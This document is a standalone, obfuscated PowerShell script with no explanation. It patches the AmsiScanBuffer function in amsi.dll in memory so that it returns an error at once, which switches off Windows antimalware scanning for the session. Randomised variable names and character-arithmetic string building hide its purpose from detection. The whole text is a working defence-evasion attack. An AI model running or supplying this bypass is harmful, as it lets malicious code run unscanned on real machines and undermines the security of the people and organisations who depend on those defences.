$zRuS = @"
using System;
using System.Runtime.InteropServices;
public class zRuS {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr lye, string lZFNkUR4Z7Pp9Ot8s3S);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr LtkAQ, UIntPtr CUdnW8i, uint Wg_33Ic2yeO0mK8, out uint JPOvLppojvNp);
}
"@

Add-Type $zRuS

$MjjnWA45 = [zRuS]::LoadLibrary("$([Char](97*50/50)+[CHAr](109)+[cHAr]([byte]0x73)+[char](105*44/44)+[cHAR]([byTe]0x2e)+[cHaR](100)+[cHAr]([byTE]0x6c)+[chAR](108*30/30))")
$YxfwdPbuHkcH6 = [zRuS]::GetProcAddress($MjjnWA45, "$([CHar]([ByTE]0x41)+[CHar]([bytE]0x6d)+[ChAR](115)+[ChaR]([BYTE]0x69)+[Char](83)+[cHar]([BYtE]0x63)+[ChAR](97*51/51)+[chaR](93+17)+[Char]([Byte]0x42)+[ChAr](103+14)+[Char](102)+[chAr]([BYTE]0x66)+[cHaR]([ByTE]0x65)+[ChaR]([BYTE]0x72))")
$p = 0
[zRuS]::VirtualProtect($YxfwdPbuHkcH6, [uint32]5, 0x40, [ref]$p)
$l0E0GMC1WLAhac6 = "0xB8"
$K4Ruur2rX = "0x57"
$CgQC5IUpTGgiCjDjOVEd = "0x00"
$gZQyD = "0x07"
$aCid3I3ZNBSUc = "0x80"
$AYfOu9mRc = "0xC3"
$rHndJ8vQABU2mm = [Byte[]] ($l0E0GMC1WLAhac6,$K4Ruur2rX,$CgQC5IUpTGgiCjDjOVEd,$gZQyD,+$aCid3I3ZNBSUc,+$AYfOu9mRc)
[System.Runtime.InteropServices.Marshal]::Copy($rHndJ8vQABU2mm, 0, $YxfwdPbuHkcH6, 6)